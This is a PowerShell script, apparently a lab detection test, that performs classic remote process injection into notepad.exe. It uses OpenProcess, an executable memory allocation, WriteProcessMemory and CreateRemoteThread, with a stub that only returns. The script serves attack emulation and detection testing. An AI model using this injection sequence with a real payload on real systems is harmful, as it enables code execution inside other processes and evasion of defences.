# Controlled memory-injection test on the lab server.
# Opens a target process, allocates remote memory, writes a benign stub and
# starts a remote thread. The stub only returns, so nothing harmful runs; the
# point is the observable process-memory manipulation.
$ErrorActionPreference = 'Stop'
$target = 'notepad.exe'
$existing = Get-Process -Name ($target -replace '\.exe$','') -ErrorAction SilentlyContinue
if (-not $existing) {
    Start-Process notepad.exe | Out-Null
    Start-Sleep -Seconds 4
}
$proc = Get-Process -Name ($target -replace '\.exe$','') | Select-Object -First 1
"target=$($proc.ProcessName) pid=$($proc.Id)"

Add-Type -Namespace LabInject -Name Native -MemberDefinition @'
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr VirtualAllocEx(IntPtr handle, IntPtr address, IntPtr size, uint allocationType, uint protect);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool WriteProcessMemory(IntPtr handle, IntPtr address, byte[] buffer, IntPtr size, out IntPtr written);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern IntPtr CreateRemoteThread(IntPtr handle, IntPtr attributes, IntPtr stackSize, IntPtr startAddress, IntPtr parameter, uint flags, out IntPtr threadId);
[DllImport("kernel32.dll", SetLastError=true)]
public static extern bool CloseHandle(IntPtr handle);
'@

$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT_RESERVE = 0x3000
$PAGE_EXECUTE_READWRITE = 0x40

$handle = [LabInject.Native]::OpenProcess($PROCESS_ALL_ACCESS, $false, $proc.Id)
"OpenProcess handle=$handle lastError=$([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
$address = [LabInject.Native]::VirtualAllocEx($handle, [IntPtr]::Zero, [IntPtr]64, $MEM_COMMIT_RESERVE, $PAGE_EXECUTE_READWRITE)
"VirtualAllocEx address=0x$($address.ToInt64().ToString('x'))"

# xor eax, eax ; ret  -- the remote thread returns immediately
[byte[]]$stub = 0x31, 0xC0, 0xC3
$written = [IntPtr]::Zero
$ok = [LabInject.Native]::WriteProcessMemory($handle, $address, $stub, [IntPtr]$stub.Length, [ref]$written)
"WriteProcessMemory ok=$ok bytes=$($written.ToInt64())"

$threadId = [IntPtr]::Zero
$thread = [LabInject.Native]::CreateRemoteThread($handle, [IntPtr]::Zero, [IntPtr]::Zero, $address, [IntPtr]::Zero, 0, [ref]$threadId)
"CreateRemoteThread handle=$thread threadId=$($threadId.ToInt64())"
Start-Sleep -Seconds 3
[LabInject.Native]::CloseHandle($handle) | Out-Null
"injection sequence complete"
